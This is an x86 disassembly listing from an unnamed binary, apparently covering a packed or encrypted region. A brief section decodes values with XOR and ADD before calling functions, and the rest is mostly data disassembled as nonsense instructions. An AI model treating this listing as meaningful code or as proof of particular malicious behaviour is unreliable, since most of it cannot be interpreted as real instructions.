  408199:	pop    ss
  40819a:	scas   al,BYTE PTR es:[edi]
  40819b:	(bad)  
  40819c:	iret   
  40819d:	push   ds
  40819e:	vpcomd xmm4,xmm2,XMMWORD PTR [edx+ebp*4-0x5b],0x63
  4081a6:	pop    ss
  4081a7:	adc    eax,0x7e3310f9
  4081ac:	or     esp,DWORD PTR [ecx+0xed6131e]
  4081b2:	pop    ebp
  4081b3:	dec    ecx
  4081b4:	cmp    DWORD PTR [esi+0x0],ecx
  4081b7:	mov    esp,0x1d6c8191
  4081bc:	jge    0x4081e8
  4081be:	cmp    al,0xdc
  4081c1:	in     al,0x9c
  4081c3:	jl     0x408153
  4081c5:	push   ebp
  4081c6:	popa   
  4081c7:	ret    0x796d
  4081ca:	sahf   
  4081cb:	mov    ecx,0x5cfc9cea
  4081d0:	adc    al,BYTE PTR [edx+0x30]
  4081d3:	xor    cl,BYTE PTR [ebp+0x45890445]
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	adc    al,0xa5
  40826a:	xchg   edx,eax
  40826b:	in     al,dx
  40826c:	aaa    
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x408281
  408275:	sub    BYTE PTR [edx],dh
  408277:	pmaxsw mm2,mm6
  40827a:	neg    BYTE PTR ds:0x40bc8874
  408280:	repnz repnz pop esp
  408283:	lods   al,BYTE PTR ds:[esi]
  408284:	out    0xaa,eax
  408286:	call   0x8a28c8fd
  40828b:	pushf  
  40828c:	cmc    
  40828d:	cs push ebx
  40828f:	mov    ah,0x91
  408291:	jp     0x40823a
  408293:	rol    esi,0x27
  408296:	fwait
  408297:	jg     0x4082f0
  408299:	adc    eax,0x8ace78b5
  40829e:	(bad)  
  40829f:	cli    
  4082a0:	imul   esi,DWORD PTR [ebx+0x6e],0xf66be216
  4082a7:	mov    al,0xa6
  4082a9:	loopne 0x4082f4
  4082ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082ac:	lock lods eax,DWORD PTR ds:[esi]
  4082ae:	jl     0x408254
  4082b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082b1:	fild   QWORD PTR [edx+eiz*1+0xa]
  4082b5:	cmp    al,0xd4
  4082b7:	test   al,0x46
  4082b9:	inc    ecx
  4082ba:	neg    BYTE PTR [edi-0x628f4ada]
  4082c0:	mov    WORD PTR [edx],gs
  4082c2:	xchg   edx,eax
  4082c3:	(bad)  
  4082c4:	cmc    
  4082c5:	aad    0x38
  4082c7:	xchg   esi,esi
  4082c9:	cli    
  4082ca:	sub    al,0x8a
  4082cc:	xchg   esi,eax
  4082cd:	sar    BYTE PTR [esi],1
  4082cf:	adc    al,BYTE PTR [ebx]
  4082d1:	mov    fs,WORD PTR [edx+ebp*1+0x143923f9]
  4082d8:	and    ebx,DWORD PTR [eax-0x12]
  4082db:	loop   0x40833b
  4082dd:	iret   
  4082de:	mov    esp,0xb347d3e3
  4082e3:	test   al,0x74
  4082e5:	push   ecx
  4082e6:	and    esp,DWORD PTR [ebp-0x67]
  4082e9:	dec    ebx
  4082ea:	cmp    esi,ecx
  4082ec:	in     al,0xc9
  4082ee:	(bad)  
  4082ef:	idiv   ebx
  4082f1:	mov    cl,0x12
  4082f3:	mov    ebx,0xf7e908ef
  4082f8:	cmp    BYTE PTR [edx+0x7db36500],bl
  4082fe:	sahf   
  4082ff:	mov    DWORD PTR [edi-0xb],ebp
  408302:	adc    DWORD PTR [ecx-0x739c942f],edi
  408308:	outs   dx,DWORD PTR ds:[esi]
  408309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40830a:	mov    esp,0xc463ba7c
  40830f:	out    dx,eax
  408310:	fidiv  DWORD PTR [ebp+ebx*1-0x11]
  408314:	fisub  DWORD PTR [esi+edx*8]
  408317:	not    BYTE PTR [eax+eiz*2]
  40831a:	pop    ss
  40831b:	fwait
  40831c:	dec    ebp
  40831d:	fs inc ecx
  40831f:	xchg   bh,cl
  408321:	ins    BYTE PTR es:[edi],dx
  408322:	sar    BYTE PTR [ebp+0x7e],cl
  408325:	fisub  DWORD PTR es:0x68b6e720
  40832c:	(bad)  
  40832d:	jmp    0x4082c3
  40832f:	(bad)  
  408330:	sub    esp,DWORD PTR [ebx]
  408332:	dec    ebp
  408333:	repnz inc edi
  408335:	or     dl,BYTE PTR [eax-0x65]
  408338:	sub    BYTE PTR [edx-0x51],bh
  40833b:	test   BYTE PTR [eax-0x7b],ah
  40833e:	mov    edx,0x9f555a4
  408343:	int    0xda
  408345:	lods   al,BYTE PTR ds:[esi]
  408346:	nop
  408347:	sbb    eax,0xcc690c60
  40834c:	dec    edi
  40834d:	xor    BYTE PTR [esi+0x16],0x2f
  408351:	fist   DWORD PTR [edx-0x45d1d5b4]
  408357:	adc    DWORD PTR [ebx+0x563324f0],ebx
  40835d:	xchg   ecx,eax
  40835e:	mov    ch,0xf1
  408360:	data16 js 0x408314
  408363:	push   edx
  408364:	leave  
  408365:	shl    BYTE PTR [edi],cl
  408367:	sbb    eax,0x14af411f
  40836c:	neg    esp
  40836e:	mov    dh,0x72
  408370:	pop    ecx
  408371:	lods   eax,DWORD PTR ds:[esi]
  408372:	dec    esp
  408373:	pop    ecx
  408374:	clc    
  408375:	xor    eax,0x5877191e
  40837a:	xor    eax,0xc4c32696
  40837f:	or     BYTE PTR [edx],bh
  408381:	das    
  408382:	or     DWORD PTR [edi-0x4c3f1978],esi
  408388:	hlt    
  408389:	(bad)  
  40838a:	sbb    al,0xaa
  40838c:	stos   DWORD PTR es:[edi],eax
  40838d:	push   edi
  40838e:	and    al,BYTE PTR ds:0xf2aecdb7
  408394:	cmp    eax,DWORD PTR [eax+0x75]
  408397:	mov    ds:0x4e696758,eax
  40839c:	and    BYTE PTR [ebp-0x65321117],dl
  4083a2:	inc    ecx
  4083a3:	je     0x408419
  4083a5:	bnd jge 0x4083a3
  4083a8:	xchg   ebx,eax
  4083a9:	jne    0x4083e8
  4083ab:	sbb    ebx,DWORD PTR [esi+ebx*8-0x2c12f2af]
  4083b2:	inc    ebp
  4083b3:	xchg   esp,eax
  4083b4:	pop    eax
  4083b5:	jg     0x408353
  4083b7:	xor    BYTE PTR [esi+0x42],ch
  4083ba:	nop
  4083bb:	ror    DWORD PTR [eax+0x62522e7d],1
  4083c1:	fdivr  st,st(0)
  4083c3:	sbb    BYTE PTR [edx-0x2bc3c8d2],0x51
  4083ca:	sahf   
  4083cb:	nop
  4083cc:	mov    eax,0xb6398036
  4083d1:	and    BYTE PTR [ecx-0x54fd1e4],al
  4083d7:	(bad)  
  4083d8:	pop    edi
  4083d9:	out    0xfa,al
  4083db:	pop    ebp
  4083dc:	int    0x65
  4083de:	mov    eax,ds:0xb9b76d39
  4083e3:	aad    0x88
  4083e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083e6:	pop    edx
  4083e7:	fwait
  4083e8:	in     eax,0xb2
  4083ea:	or     ch,BYTE PTR [ecx-0x60638304]
  4083f0:	xor    ecx,edx
  4083f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083f3:	out    0xcb,al
  4083f5:	mov    dh,0x1d
  4083f7:	mov    DWORD PTR [eax],esi
  4083f9:	imul   ecx,DWORD PTR [edx+ebx*1],0x51
  4083fd:	and    DWORD PTR [ebx-0x43d8ed1a],ebp
  408403:	cmp    DWORD PTR [edi+edi*1-0x2af981de],0x74
  40840b:	push   edi
  40840c:	in     al,dx
  40840d:	lock adc DWORD PTR [edx],esp
  408410:	xor    eax,0xabdcf6fc
  408415:	cwde   
  408416:	mov    DWORD PTR [ebp-0x17cecd80],esp
  40841c:	stc    
  40841d:	cmp    DWORD PTR [esi-0x881921],ebx
  408423:	rcl    DWORD PTR [ebx+0x763c8cea],0xe3
  40842a:	loope  0x40847f
  40842c:	aaa    
  40842d:	mov    al,0x95
  40842f:	jle    0x408410
  408431:	adc    eax,ebx
  408433:	sub    DWORD PTR [ebp-0x7c],0xffffff86
  408437:	cmp    ebx,ebp
  408439:	mov    al,ds:0xdc38d67
  40843e:	iret   
  40843f:	in     al,dx
  408440:	cmp    bl,0xc6
  408443:	xor    al,0xdc
  408445:	jle    0x408405
  408447:	sbb    dl,0x9
  40844a:	(bad)  
  40844c:	inc    ebx
  40844d:	jp     0x4084a8
  40844f:	add    DWORD PTR [edx],eax
  408451:	push   esp
  408452:	in     al,0xaf
  408454:	adc    eax,0x6d37f91
  408459:	inc    edi
  40845a:	xchg   DWORD PTR [eax+0x5c],esi
  40845d:	stc    
  40845e:	dec    ebp
  40845f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408460:	sbb    al,0x34
  408462:	xor    eax,DWORD PTR [eax+0x5b]
  408465:	in     eax,dx
  408466:	pop    esi
  408467:	add    eax,0x375efd47
  40846c:	sar    BYTE PTR [ebp+0x2075b453],cl
  408472:	in     al,0x7a
  408474:	add    eax,0x8139329d
  408479:	adc    dl,BYTE PTR [esi-0x1fc880]
  40847f:	cmp    eax,0xfd14a1a2
  408484:	xlat   BYTE PTR ds:[ebx]
  408485:	jns    0x4084a2
  408487:	mov    al,ds:0x2d33dfb0
  40848c:	inc    eax
  40848d:	jmp    0xb0c1:0x4a789161
  408494:	mov    eax,DWORD PTR [ebp+0x67]
  408497:	je     0x4084df
  408499:	xor    DWORD PTR [esi-0x6104cce],esp
  40849f:	sub    al,0x51
  4084a1:	icebp  
  4084a2:	xchg   ebx,eax
  4084a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084a4:	sub    ah,BYTE PTR [ebp+0x6a]
  4084a7:	out    dx,al
  4084a8:	cmp    al,0xa5
  4084aa:	aaa    
  4084ab:	ret    0x46a5
  4084ae:	or     al,0x2d
  4084b0:	mov    DWORD PTR [eax+0x1e],edi
  4084b3:	(bad)  
  4084b5:	sub    al,0x70
  4084b7:	sbb    ch,BYTE PTR [ebx+0x1d0aba9b]
  4084bd:	mov    bh,0x22
  4084bf:	sub    al,0x5f
  4084c1:	fldcw  WORD PTR [ebx]
  4084c3:	mov    esp,0x461dbfe9
  4084c8:	es ins DWORD PTR es:[edi],dx
  4084ca:	adc    DWORD PTR [eax],edx
  4084cc:	add    esp,ebp
  4084ce:	xchg   esp,eax
  4084cf:	cmp    al,0xc
  4084d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084d2:	lods   eax,DWORD PTR ds:[esi]
  4084d3:	std    
  4084d4:	stc    
  4084d5:	cld    
  4084d6:	fild   QWORD PTR [eax]
  4084d8:	push   ds
  4084d9:	stos   BYTE PTR es:[edi],al
  4084da:	mov    fs,WORD PTR [ecx+0x4f]
  4084dd:	mov    al,0x95
  4084df:	out    dx,eax
  4084e0:	sub    BYTE PTR [esi],dh
  4084e2:	push   ebx
  4084e3:	adc    esi,DWORD PTR [esi-0x77]
  4084e6:	mov    ecx,0x8ec45fd7
  4084eb:	in     eax,dx
  4084ec:	jns    0x4084d1
  4084ee:	jbe    0x408525
  4084f0:	push   cs
  4084f1:	mov    ah,0xb
  4084f3:	imul   esp,eax,0x91fd1155
  4084f9:	or     eax,0xb15fe5e6
  4084fe:	sbb    al,0xe5
  408500:	inc    edx
  408501:	sar    DWORD PTR [ebx+0x5cb8ee80],cl
  408507:	push   ss
  408508:	es mov ch,0xa8
  40850b:	int    0xbe
  40850d:	(bad)  
  40850e:	sub    ebx,DWORD PTR [ebp+0x21630dbb]
  408514:	scas   eax,DWORD PTR es:[edi]
  408515:	lods   al,BYTE PTR ds:[esi]
  408516:	dec    esp
  408517:	fwait
  408518:	lea    edi,[esi+0xc7a65b]
  40851e:	and    BYTE PTR ds:0x5eb7bbdb,cl
  408524:	ja     0x408587
  408526:	bound  eax,QWORD PTR [eax+edi*2]
  408529:	push   esi
  40852a:	imul   edi,DWORD PTR [eax-0x60],0xffffffc2
  40852e:	add    DWORD PTR [edi-0x4ac79f3d],edi
  408534:	push   ss
  408535:	or     eax,0xaeb63180
  40853a:	sub    al,0x3e
  40853c:	xchg   edx,eax
  40853d:	xchg   esp,eax
  40853e:	mov    cl,0xc7
  408540:	test   al,0x45
  408542:	cld    
  408543:	jecxz  0x40858b
  408545:	jo     0x4084ed
  408547:	or     eax,0x5b3c953e
  40854c:	sar    BYTE PTR [ebx+0x26],0x4d
  408550:	or     BYTE PTR [ebp-0x61f07ea7],0x9
  408557:	adc    BYTE PTR [edx],cl
  408559:	test   al,0x23
  40855b:	fsubr  st(6),st
  40855d:	div    BYTE PTR [edx+0x51]
  408560:	add    al,0xad
  408562:	jb     0x408569
  408564:	cdq    
  408565:	adc    BYTE PTR [edx-0x5e2bdeb3],dh
  40856b:	mov    dh,0xcf
  40856d:	mov    edx,0x29f5fb46
  408572:	repnz cli 
  408574:	mov    BYTE PTR [ebp-0x32],ah
  408577:	test   al,0x4d
  408579:	aad    0x89
  40857b:	cmc    
  40857c:	adc    al,0x93
  40857e:	mov    ds:0xd73a0ed1,eax
  408583:	popf   
  408584:	fld    TBYTE PTR [ecx-0x1b]
  408587:	xor    edx,DWORD PTR [ebp+0x579fc345]
  40858d:	mov    WORD PTR [edx],?
  40858f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408590:	xor    ch,BYTE PTR [ebx+0x16aa5b9f]
  408596:	shl    DWORD PTR [edi+0x5f47ae29],1
  40859c:	psadbw mm4,QWORD PTR [ebp-0x96de1f7]
  4085a3:	ror    DWORD PTR [eax+0x348e901],1
  4085a9:	add    BYTE PTR [eax],al
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x745f3791
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x408547
  4085c4:	rcl    bl,1
  4085c6:	or     eax,0x8bd918ac
  4085cb:	xor    eax,0xf7b80a2
  4085d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d1:	mov    esp,0xbfb8f29a
  4085d6:	dec    edx
  4085d7:	lds    ebx,FWORD PTR [edi]
  4085d9:	je     0x40858c
  4085db:	aad    0x2a
  4085dd:	push   ebp
  4085de:	sub    al,0x8a
  4085e0:	cmc    
  4085e1:	icebp  
  4085e2:	or     al,0x4b
  4085e4:	jno    0x40864c
  4085e6:	into   
  4085e7:	aas    
  4085e8:	rcl    BYTE PTR [esi],0x89
  4085eb:	je     0x40860f
  4085ed:	iret   
  4085ee:	jmp    0x78f4108b
  4085f3:	push   ebp
  4085f4:	popf   
  4085f5:	sti    
  4085f6:	lods   eax,DWORD PTR ds:[esi]
  4085f7:	std    
  4085f8:	mov    dh,0x4b
  4085fa:	out    0x1a,al
  4085fc:	sub    ah,BYTE PTR [ecx-0x72]
  4085ff:	mov    edi,0xdf59050e
  408604:	imul   esi,DWORD PTR [eax+0x699274c9],0x7ec710d4
  40860e:	pop    ebp
  40860f:	stc    
  408610:	shl    DWORD PTR [ecx-0x48],cl
  408613:	pop    esp
  408614:	push   ebx
  408615:	push   ds
  408616:	pop    esp
  408617:	rcr    DWORD PTR [ebp-0x66],1
  40861a:	jnp    0x408620
  40861c:	(bad)  
  40861d:	loop   0x4085c3
  40861f:	or     eax,0xbdf050e9
  408624:	test   eax,0x26b8043d
  408629:	add    ebx,DWORD PTR [edx+ecx*2]
  40862c:	scas   al,BYTE PTR es:[edi]
  40862d:	jle    0x40869e
  40862f:	sbb    ecx,DWORD PTR [eax+0x77]
  408632:	add    al,0x20
  408634:	add    DWORD PTR [ecx+0x7c],ebx
  408637:	push   cs
  408638:	jp     0x4085bb
  40863a:	pusha  
  40863b:	pop    es
  40863c:	stc    
  40863d:	mov    ebx,0xbf01bd24
  408642:	pop    ecx
  408643:	ins    BYTE PTR es:[edi],dx
  408644:	pop    es
  408645:	outs   dx,BYTE PTR ds:[esi]
  408646:	inc    edi
  408647:	sub    BYTE PTR [ecx+ecx*8-0x69],0x4d
  40864c:	xor    eax,0x3bf8dc72
  408651:	call   0xec3dbe3d
  408656:	clc    
  408657:	iret   
  408658:	in     eax,dx
  408659:	inc    edi
  40865a:	lods   eax,DWORD PTR ds:[esi]
  40865b:	or     al,0xac
  40865d:	xchg   esi,eax
  40865e:	push   ebp
  40865f:	push   edx
  408660:	xlat   BYTE PTR ds:[ebx]
  408661:	xor    ecx,DWORD PTR [ecx+0x2c]
  408664:	add    bl,bl
  408666:	retf   
  408667:	dec    ebx
  408668:	jb     0x408692
  40866a:	mov    ebx,0x683ef78f
  40866f:	jecxz  0x4086e4
  408671:	jle    0x4086b1
  408673:	idiv   DWORD PTR [eax]
  408675:	int3   
  408676:	mov    esp,0xd03d9b2c
  40867b:	or     dh,BYTE PTR [edx+0x798956f7]
  408681:	call   DWORD PTR [edi-0x53]
  408684:	mov    esi,0xfd05d7e
  408689:	mov    dl,0x56
  40868b:	test   eax,0x35db0d1d
  408690:	sahf   
  408691:	rcl    DWORD PTR [edx-0x654a133b],cl
  408697:	in     al,dx
  408698:	ds or  bl,BYTE PTR cs:[ebp+0x5d32955e]
  4086a0:	push   es
  4086a1:	and    DWORD PTR [ecx-0x2413a7cf],esi
  4086a7:	loopne 0x4086f1
  4086a9:	mov    DWORD PTR [eax+ebp*1],eax
  4086ac:	lods   eax,DWORD PTR ds:[esi]
  4086ad:	mov    ds:0x4d4a429f,eax
  4086b2:	xor    al,0xfa
  4086b4:	jg     0x40869f
  4086b6:	mov    ebp,0x3698a1e3
  4086bb:	xor    DWORD PTR [eax],eax
  4086bd:	out    dx,eax
  4086be:	mov    eax,ds:0xb93ecd8d
  4086c3:	inc    ebx
  4086c4:	fistp  QWORD PTR [ebp-0x65]
  4086c7:	inc    esi
  4086c8:	cdq    
  4086c9:	or     dh,cl
  4086cb:	add    eax,0xcb08844f
  4086d0:	pop    edx
  4086d1:	pop    ds
  4086d2:	and    DWORD PTR [ebp+0x6e],eax
  4086d5:	hlt    
  4086d6:	fild   WORD PTR [edi+0x46]
  4086d9:	jp     0x408714
  4086db:	jbe    0x4086b0
  4086dd:	scas   al,BYTE PTR es:[edi]
  4086de:	test   bh,0x45
  4086e1:	js     0x4086e1
  4086e3:	dec    edi
  4086e4:	or     al,BYTE PTR [edi+0x5e]
  4086e7:	hlt    
  4086e8:	popf   
  4086e9:	in     al,0xb0
  4086eb:	aad    0x30
  4086ed:	mov    ah,0x6d
  4086ef:	imul   edi,DWORD PTR [edi+0x61],0x72
  4086f3:	mov    esp,0x6afef157
  4086f8:	sbb    eax,0x56bc0552
  4086fd:	rcr    BYTE PTR [ebx+0x50a6bc6],cl
  408703:	outs   dx,DWORD PTR ds:[esi]
  408704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408705:	call   0x7f68:0xf536f2d5
  40870c:	push   0x72655960
  408711:	outs   dx,DWORD PTR ds:[esi]
  408712:	inc    edi
  408713:	jecxz  0x4086d8
  408715:	xchg   edi,eax
  408716:	icebp  
  408717:	and    eax,ebp
  408719:	test   DWORD PTR [edi+0x1377039],edi
  40871f:	fdiv   DWORD PTR [ecx]
  408721:	jb     0x408772
  408723:	aam    0x7b
  408725:	dec    ebx
  408726:	push   0xfffffffb
  408728:	add    DWORD PTR [edx+0x15ed96dc],ebx
  40872e:	xchg   DWORD PTR [ebx],ebp
  408730:	add    ch,BYTE PTR [ebx-0x15]
  408733:	stos   BYTE PTR es:[di],al
  408735:	adc    bh,BYTE PTR [esi+0x2fc1bf24]
  40873b:	xchg   ecx,eax
  40873c:	mov    edi,0x203384a1
  408741:	jp     0x408762
  408743:	or     BYTE PTR [eax-0x1a],0x55
  408747:	pop    esi
  408748:	aas    
  408749:	fisttp WORD PTR ds:0x596bc21e
  40874f:	push   edx
  408750:	into   
  408751:	add    BYTE PTR [ebp+0x62482534],al
  408757:	xor    esp,DWORD PTR [esi]
  408759:	shl    DWORD PTR [ebx-0x62ad87e4],1
  40875f:	call   0xe5a9:0x7c6effe9
  408766:	lock push 0xeb8d0a74
  40876c:	xchg   ecx,eax
  40876d:	push   ebx
  40876e:	dec    ebx
  40876f:	mov    dl,0xe0
  408771:	and    eax,0x33e4b985
  408776:	xchg   ebp,eax
  408777:	out    dx,eax
  408778:	ja     0x4087ad
  40877a:	dec    ebp
  40877b:	push   ebp
  40877c:	mov    dh,0x56
  40877e:	je     0x40874b
  408780:	clc    
  408781:	(bad)  
  408782:	jns    0x40878c
  408784:	das    
  408785:	retf   0xa503
  408788:	(bad)  
  408789:	jecxz  0x408781
  40878b:	(bad)  
  40878d:	fcomp  st(2)
  40878f:	fucomi st,st(3)
  408791:	adc    BYTE PTR [edi-0x79c16ab8],ah
  408797:	pop    ebp
  408798:	xchg   ebp,eax
  408799:	mov    esi,0x1880ed13
  40879e:	mov    cl,0x5
  4087a0:	fwait
  4087a1:	repnz mov DWORD PTR [ebp+eiz*4+0x4a],0x232c93b6
  4087aa:	hlt    
  4087ab:	outs   dx,BYTE PTR ds:[esi]
  4087ac:	enter  0x36ee,0x4
  4087b0:	nop
  4087b1:	mov    ch,0x45
  4087b3:	mov    eax,esp
  4087b5:	int    0xcb
  4087b7:	xor    cl,dl
  4087b9:	jno    0x408776
  4087bb:	aam    0xe3
  4087bd:	stos   DWORD PTR es:[edi],eax
  4087be:	pop    ss
  4087bf:	lea    edi,[ecx]
  4087c1:	pop    ss
  4087c2:	cld    
  4087c3:	stos   BYTE PTR es:[edi],al
  4087c4:	rcr    DWORD PTR [ecx],0x30
  4087c7:	jns    0x408786
  4087c9:	pop    edi
  4087ca:	jmp    0xc771:0x8f86f705
  4087d1:	pop    ds
  4087d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d3:	push   eax
  4087d4:	fdiv   st(0),st
  4087d6:	and    al,0x88
  4087d8:	and    edx,ecx
  4087da:	xor    al,0xd1
  4087dc:	xor    dh,BYTE PTR [eax]
  4087de:	in     al,dx
  4087df:	inc    edx
  4087e0:	cmc    
  4087e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087e2:	add    DWORD PTR [edi-0x5ba2db74],esi
  4087e8:	xor    eax,0x9c4ddfd1
  4087ed:	xchg   ecx,eax
  4087ee:	ins    DWORD PTR es:[edi],dx
  4087ef:	mov    edx,0x144430cb
  4087f4:	xor    bl,BYTE PTR [edi]
  4087f6:	add    eax,0xc5948ea7
  4087fb:	xor    eax,0x99031257
  408800:	jecxz  0x4087df
  408802:	sar    DWORD PTR ds:0x237ee4cd,0xf7
  408809:	add    eax,0x1f90a32b
  40880e:	pushf  
  40880f:	mov    esp,0xa1d1e77e
  408814:	pop    ecx
  408815:	lahf   
  408816:	mov    eax,0x1dffcab1
  40881b:	sti    
  40881c:	lods   al,BYTE PTR ds:[esi]
  40881d:	mov    ah,BYTE PTR [edi]
  40881f:	xor    eax,0xacfb6b38
  408824:	jb     0x40885c
  408826:	cmp    al,0x41
  408828:	pop    ds
  408829:	test   al,0xee
  40882b:	sub    BYTE PTR [ecx+0x2b],cl
  40882e:	sub    al,0x1c
  408830:	jmp    DWORD PTR ds:0x54133f95
  408836:	lds    ecx,FWORD PTR [ecx]
  408838:	xor    ecx,0xffffff96
  40883b:	inc    ebp
  40883c:	popf   
  40883d:	fst    QWORD PTR [esi+eiz*4]
  408840:	dec    edi
  408841:	and    cl,al
  408843:	ret    0xfbb7
  408846:	jmp    0x5f03:0x8a51677e
  40884d:	jle    0x408832
  40884f:	mov    eax,eax
  408851:	adc    al,0xf4
  408853:	or     BYTE PTR [ecx-0x52575cbe],dl
  408859:	aas    
  40885a:	add    edi,DWORD PTR [ebp-0x75]
  40885d:	push   eax
  40885e:	imul   eax,DWORD PTR [esi-0xc],0xdee83d8e
  408865:	fld    TBYTE PTR [edx+0x8]
  408868:	ins    DWORD PTR es:[edi],dx
  408869:	cmc    
  40886a:	mov    ebp,0xf11ef277
  40886f:	(bad)  
  408870:	test   al,0xc9
  408872:	mov    ecx,0x5697e87c
  408877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408878:	xor    eax,0x797b41c0
  40887d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40887e:	lods   eax,DWORD PTR ds:[esi]
  40887f:	(bad)  
  408880:	adc    al,0xfb
  408882:	inc    ecx
  408883:	retf   
  408884:	pop    edi
  408885:	push   0x8b35e320
  40888a:	mov    al,0xe0
  40888c:	fs xor eax,0x3ea2e4f6
  408892:	sub    eax,0xc5650079
  408897:	repnz add edi,esi
  40889a:	test   eax,0xa5f91681
  40889f:	and    eax,0xe968e337
  4088a4:	inc    ebx
  4088a5:	or     esi,DWORD PTR [ecx+0x2d871a9c]
  4088ab:	retf   0xb75c
  4088ae:	scas   eax,DWORD PTR es:[edi]
  4088af:	repnz xor al,0x7d
  4088b2:	iret   
  4088b3:	out    0x7f,al
  4088b5:	inc    eax
  4088b6:	imul   edx,DWORD PTR [ebx-0x6c1ee214],0x13d860eb
  4088c0:	xchg   ecx,eax
  4088c1:	inc    ebx
  4088c2:	lods   al,BYTE PTR ds:[esi]
  4088c3:	xor    eax,0xb18c39cb
  4088c8:	fstp   TBYTE PTR es:[edx]
  4088cb:	mov    bl,dl
  4088cd:	mov    ds:0xb8b5eec9,al
  4088d2:	inc    edx
  4088d3:	shl    BYTE PTR [eax-0x13],1
  4088d6:	mov    dh,0x73
  4088d8:	sar    DWORD PTR [ebp+0x7f],1
  4088db:	aam    0x52
  4088dd:	ss je  0x40887b
  4088e0:	jg     0x408864
  4088e2:	add    bh,BYTE PTR [edx+0x37]
  4088e5:	adc    bl,dl
  4088e7:	test   esi,esp
  4088e9:	sbb    al,0x60
  4088eb:	bound  esp,QWORD PTR [eax+edi*1]
  4088ee:	ds hlt 
  4088f0:	mov    ebx,0x458da650
  4088f5:	clc    
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x31bca301],cl
  40890c:	in     al,dx
  40890d:	enter  0x976c,0xdc
  408911:	jo     0x408983
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x408946
  408918:	pop    edi
  408919:	in     al,dx
  40891a:	push   cs
  40891b:	pop    edi
  40891c:	retf   0x9f14
  40891f:	mov    esi,0x138397b8
  408924:	sub    DWORD PTR ss:[edx+0x6d],0x143c3cf9
  40892c:	das    
  40892d:	pop    ecx
  40892e:	inc    edx
  40892f:	push   es
  408930:	ins    BYTE PTR es:[edi],dx
  408931:	xor    DWORD PTR [eax],0x4e469196
  408937:	xchg   BYTE PTR [esi+0x71],ah
  40893a:	sub    eax,0xd609f83f
  40893f:	add    ebp,DWORD PTR [ebx-0x25d34d9f]
  408945:	push   edi
  408946:	xor    eax,0x2d00578c
  40894b:	sub    eax,ebp
  40894d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40894e:	adc    esp,DWORD PTR [edx]
  408950:	repz sbb al,0x3e
  408953:	ja     0x4088e9
  408955:	jp     0x40890b
  408957:	xchg   DWORD PTR [eax+0x67],ebp
  40895a:	das    
  40895b:	sub    eax,0x3d935dd6
  408960:	jmp    0x408983
  408962:	jb     0x408947
  408964:	cld    
  408965:	xchg   edi,eax
  408966:	jmp    0x408992
  408968:	dec    edx
  408969:	mov    dh,0x97
  40896b:	sbb    al,BYTE PTR [ebx-0x225a989e]
  408971:	dec    edx
  408972:	xlat   BYTE PTR ds:[ebx]
  408973:	xchg   edi,eax
  408974:	ror    BYTE PTR [edi+eiz*8+0x3d],cl
  408978:	cs jo  0x408981
  40897b:	push   ds
